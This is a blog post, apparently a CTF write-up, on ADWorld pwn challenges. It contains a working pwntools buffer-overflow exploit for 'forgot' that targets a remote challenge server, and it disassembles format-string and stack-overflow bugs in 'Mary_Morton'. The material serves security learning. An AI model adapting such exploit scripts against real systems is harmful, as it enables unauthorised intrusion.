<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>ADWorld 1 | The Space Between Us</title><meta property="og:title" content="ADWorld 1 | The Space Between Us"><meta name=twitter:title content="ADWorld 1 | The Space Between Us"><meta itemprop=name content="ADWorld 1 | The Space Between Us"><meta name=application-name content="ADWorld 1 | The Space Between Us"><meta property="og:site_name" content="Vincebye's Blog"><meta name=description content="Minimal Hugo blog theme with light and dark mode support"><meta itemprop=description content="Minimal Hugo blog theme with light and dark mode support"><meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support"><meta name=twitter:description content="Minimal Hugo blog theme with light and dark mode support"><meta property="og:locale" content="en-us"><meta name=language content="en-us"><meta itemprop=image content="https://vincebye.github.io/"><meta property="og:image" content="https://vincebye.github.io/"><meta name=twitter:image content="https://vincebye.github.io/"><meta name=twitter:image:src content="https://vincebye.github.io/"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2021-08-03T14:16:54+0800"><meta property="article:published_time" content="2021-08-03T14:16:54+0800"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"ADWorld 1","author":{"@type":"Person","name":""},"datePublished":"2021-08-03","description":"","wordCount":1714,"mainEntityOfPage":"True","dateModified":"2021-08-03","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"The Space Between Us"}}</script><meta name=generator content="Hugo 0.111.3"><script async src="https://www.googletagmanager.com/gtag/js?id=G-GKH5P9VW55"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GKH5P9VW55")</script><link rel=canonical href=https://vincebye.github.io/posts/adworld-1/><link href=/sass/main.min.0eebb6db90b4ec9f4444ef402f08421ee056025ba860df3d749a9f299d472008.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/images/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/images/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/images/favicon/favicon-16x16.png><link rel=manifest href=/images/favicon/site.webmanifest><link rel=mask-icon href=/images/favicon/safari-pinned-tab.svg color=#5bbad5><link rel="shortcut icon" href=/images/favicon/favicon.ico><meta name=msapplication-TileColor content="#2b5797"><meta name=msapplication-config content="/images/favicon/browserconfig.xml"><meta name=theme-color content="#ffffff"><link rel=icon type=image/svg+xml href=/images/favicon/favicon.svg><script async src="https://www.googletagmanager.com/gtag/js?id=G-GKH5P9VW55"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GKH5P9VW55",{anonymize_ip:!1})}</script></head><body data-theme=dark class=notransition><script src=https://vincebye.github.io/js/themeLoader.min.4e9e1a253d543bbfec02e7f2460d9621e719fd739dc8a5256faa91cda6e12e03.js></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/about/>About</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post">   <main class=page-content aria-label=Content>       <article>           <header class=header>               <h1 class=header-title>ADWorld 1</h1>               
               <div class=post-meta>                    <time datetime=2021-08-03T14:16:54+08:00 itemprop=datePublished>3 Aug 2021</time>
               </div>           </header>           <div class=page-content>               <h1 id=forgot>forgot</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>from</span> <span class=nx>pwn</span> <span class=kr>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=nx>context</span><span class=p>.</span><span class=nx>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>sentence</span> <span class=mi>32</span>   <span class=mi>00000074</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>_DWORD</span> <span class=nx>v3</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span>   <span class=mi>00000054</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>hackme</span> <span class=mi>080486</span><span class=nx>CC</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>v5</span><span class=o>=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>sentence</span><span class=o>=</span><span class=s1>&#39;{*&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>p</span><span class=o>=</span><span class=nx>process</span><span class=p>(</span><span class=s1>&#39;./forgot&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>p</span><span class=o>=</span><span class=nx>remote</span><span class=p>(</span><span class=s1>&#39;111.200.241.244&#39;</span><span class=p>,</span><span class=mi>49781</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>payload</span><span class=o>=</span><span class=nx>b</span><span class=s1>&#39;{&#39;</span><span class=o>*</span><span class=mi>32</span><span class=o>+</span><span class=nx>p32</span><span class=p>(</span><span class=mh>0x080486CC</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>p</span><span class=p>.</span><span class=nx>sendlineafter</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>,</span><span class=s1>&#39;vincebye&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>p</span><span class=p>.</span><span class=nx>sendlineafter</span><span class=p>(</span><span class=s1>&#39;validate&#39;</span><span class=p>,</span><span class=nx>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>p</span><span class=p>.</span><span class=nx>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>找到溢出点→覆盖已有的函数</p><h1 id=未果01-mary_morton>未果01-Mary_Morton</h1><p>看起来是有两个漏洞入口可以攻击</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>sub_4008EB</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-90h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [sp+88h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x80uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x7FuLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span> <span class=p>;</span> <span class=o>===============</span> <span class=n>S</span> <span class=n>U</span> <span class=n>B</span> <span class=n>R</span> <span class=n>O</span> <span class=n>U</span> <span class=n>T</span> <span class=n>I</span> <span class=n>N</span> <span class=n>E</span> <span class=o>=======================================</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span> <span class=p>;</span> <span class=nl>Attributes</span><span class=p>:</span> <span class=n>bp</span><span class=o>-</span><span class=n>based</span> <span class=n>frame</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span> <span class=n>sub_4008EB</span>      <span class=n>proc</span> <span class=n>near</span>               <span class=p>;</span> <span class=n>CODE</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>main</span><span class=o>+</span><span class=mi>8</span><span class=n>Dp</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span> <span class=n>buf</span>             <span class=o>=</span> <span class=n>byte</span> <span class=n>ptr</span> <span class=o>-</span><span class=mi>90</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span> <span class=n>var_8</span>           <span class=o>=</span> <span class=n>qword</span> <span class=n>ptr</span> <span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EB</span>                 <span class=n>push</span>    <span class=n>rbp</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EC</span>                 <span class=n>mov</span>     <span class=n>rbp</span><span class=p>,</span> <span class=n>rsp</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>8</span><span class=n>EF</span>                 <span class=n>sub</span>     <span class=n>rsp</span><span class=p>,</span> <span class=mi>90</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00000000004008F</span><span class=mi>6</span>                 <span class=n>mov</span>     <span class=n>rax</span><span class=p>,</span> <span class=nl>fs</span><span class=p>:</span><span class=mi>28</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>00000000004008FF</span>                 <span class=n>mov</span>     <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>var_8</span><span class=p>],</span> <span class=n>rax</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>903</span>                 <span class=n>xor</span>     <span class=n>eax</span><span class=p>,</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>905</span>                 <span class=n>lea</span>     <span class=n>rdx</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>buf</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>90</span><span class=n>C</span>                 <span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>911</span>                 <span class=n>mov</span>     <span class=n>ecx</span><span class=p>,</span> <span class=mi>10</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>916</span>                 <span class=n>mov</span>     <span class=n>rdi</span><span class=p>,</span> <span class=n>rdx</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>919</span>                 <span class=n>rep</span> <span class=n>stosq</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>91</span><span class=n>C</span>                 <span class=n>lea</span>     <span class=n>rax</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>buf</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>923</span>                 <span class=n>mov</span>     <span class=n>edx</span><span class=p>,</span> <span class=mf>7F</span><span class=n>h</span>        <span class=p>;</span> <span class=n>nbytes</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>928</span>                 <span class=n>mov</span>     <span class=n>rsi</span><span class=p>,</span> <span class=n>rax</span>        <span class=p>;</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>92</span><span class=n>B</span>                 <span class=n>mov</span>     <span class=n>edi</span><span class=p>,</span> <span class=mi>0</span>          <span class=p>;</span> <span class=n>fd</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>930</span>                 <span class=n>call</span>    <span class=n>_read</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>935</span>                 <span class=n>lea</span>     <span class=n>rax</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>buf</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>93</span><span class=n>C</span>                 <span class=n>mov</span>     <span class=n>rdi</span><span class=p>,</span> <span class=n>rax</span>        <span class=p>;</span> <span class=n>format</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mf>000000000040093F</span>                 <span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>944</span>                 <span class=n>call</span>    <span class=n>_printf</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>949</span>                 <span class=n>nop</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>94</span><span class=n>A</span>                 <span class=n>mov</span>     <span class=n>rax</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>var_8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>94</span><span class=n>E</span>                 <span class=n>xor</span>     <span class=n>rax</span><span class=p>,</span> <span class=nl>fs</span><span class=p>:</span><span class=mi>28</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>957</span>                 <span class=n>jz</span>      <span class=kt>short</span> <span class=n>locret_40095E</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>959</span>                 <span class=n>call</span>    <span class=n>___stack_chk_fail</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>sub_400960</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-90h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [sp+88h] [bp-8h]@1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x80uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;-&gt; %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=nf>MK_FP</span><span class=p>(</span><span class=n>__FS__</span><span class=p>,</span> <span class=mi>40LL</span><span class=p>)</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span> <span class=p>;</span> <span class=o>===============</span> <span class=n>S</span> <span class=n>U</span> <span class=n>B</span> <span class=n>R</span> <span class=n>O</span> <span class=n>U</span> <span class=n>T</span> <span class=n>I</span> <span class=n>N</span> <span class=n>E</span> <span class=o>=======================================</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span> <span class=p>;</span> <span class=nl>Attributes</span><span class=p>:</span> <span class=n>bp</span><span class=o>-</span><span class=n>based</span> <span class=n>frame</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span> <span class=n>sub_400960</span>      <span class=n>proc</span> <span class=n>near</span>               <span class=p>;</span> <span class=n>CODE</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>main</span><span class=o>+</span><span class=mi>81</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span> <span class=n>buf</span>             <span class=o>=</span> <span class=n>byte</span> <span class=n>ptr</span> <span class=o>-</span><span class=mi>90</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span> <span class=n>var_8</span>           <span class=o>=</span> <span class=n>qword</span> <span class=n>ptr</span> <span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>960</span>                 <span class=n>push</span>    <span class=n>rbp</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>961</span>                 <span class=n>mov</span>     <span class=n>rbp</span><span class=p>,</span> <span class=n>rsp</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>964</span>                 <span class=n>sub</span>     <span class=n>rsp</span><span class=p>,</span> <span class=mi>90</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>96</span><span class=n>B</span>                 <span class=n>mov</span>     <span class=n>rax</span><span class=p>,</span> <span class=nl>fs</span><span class=p>:</span><span class=mi>28</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>974</span>                 <span class=n>mov</span>     <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>var_8</span><span class=p>],</span> <span class=n>rax</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>978</span>                 <span class=n>xor</span>     <span class=n>eax</span><span class=p>,</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>97</span><span class=n>A</span>                 <span class=n>lea</span>     <span class=n>rdx</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>buf</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>981</span>                 <span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>986</span>                 <span class=n>mov</span>     <span class=n>ecx</span><span class=p>,</span> <span class=mi>10</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>98</span><span class=n>B</span>                 <span class=n>mov</span>     <span class=n>rdi</span><span class=p>,</span> <span class=n>rdx</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>98</span><span class=n>E</span>                 <span class=n>rep</span> <span class=n>stosq</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>991</span>                 <span class=n>lea</span>     <span class=n>rax</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>buf</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>998</span>                 <span class=n>mov</span>     <span class=n>edx</span><span class=p>,</span> <span class=mi>100</span><span class=n>h</span>       <span class=p>;</span> <span class=n>nbytes</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>99</span><span class=n>D</span>                 <span class=n>mov</span>     <span class=n>rsi</span><span class=p>,</span> <span class=n>rax</span>        <span class=p>;</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>A0</span>                 <span class=n>mov</span>     <span class=n>edi</span><span class=p>,</span> <span class=mi>0</span>          <span class=p>;</span> <span class=n>fd</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>A5</span>                 <span class=n>call</span>    <span class=n>_read</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>AA</span>                 <span class=n>lea</span>     <span class=n>rax</span><span class=p>,</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=n>buf</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>B1</span>                 <span class=n>mov</span>     <span class=n>rsi</span><span class=p>,</span> <span class=n>rax</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>B4</span>                 <span class=n>mov</span>     <span class=n>edi</span><span class=p>,</span> <span class=n>offset</span> <span class=n>format</span> <span class=p>;</span> <span class=s>&#34;-&gt; %s</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>B9</span>                 <span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>BE</span>                 <span class=n>call</span>    <span class=n>_printf</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>text</span><span class=p>:</span><span class=mo>0000000000400</span><span class=mi>9</span><span class=n>C3</span>                 <span class=n>nop</span>
